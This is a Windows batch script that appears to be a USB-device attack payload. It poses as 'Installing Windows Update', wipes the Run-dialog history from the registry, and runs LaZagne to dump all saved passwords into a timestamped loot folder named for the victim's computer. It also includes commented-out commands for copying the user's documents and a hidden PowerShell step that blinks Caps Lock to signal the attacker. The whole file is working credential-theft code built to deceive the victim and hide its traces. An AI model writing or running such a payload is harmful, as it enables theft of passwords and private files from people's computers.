@echo off
@echo Installing Windows Update

REM Delete registry keys storing Run dialog history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

REM Creates directory compromised of computer name, date and time
REM %~d0 = path to this batch file. %COMPUTERNAME%, %date% and %time% pretty obvious

REM This executes LaZagne in the current directory and outputs the password file to Loot
REM Time and Date is also added
setlocal
cd /d %~dp0
%~dp0\laZagne.exe all > "%~dp0\..\..\loot\USB_Exfiltration\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%_passwords.txt"

REM These lines if you just want Passwords and no files.
set dst=%~dp0\..\..\loot\USB_Exfiltration\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
mkdir %dst% >>nul

if Exist %USERPROFILE%\Documents (
REM /C Continues copying even if errors occur.
REM /Q Does not display file names while copying.
REM /G Allows the copying of encrypted files to destination that does not support encryption.
REM /Y Suppresses prompting to confirm you want to overwrite an existing destination file.
REM /E Copies directories and subdirectories, including empty ones.

REM xcopy /C /Q /G /Y /E %USERPROFILE%\Documents\*.pdf %dst% >>nul

REM Same as above but does not create empty directories
REM xcopy /C /Q /G /Y /S %USERPROFILE%\Documents\*.flac %dst% >>nul

)

REM Blink CAPSLOCK key
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"

@cls
@exit
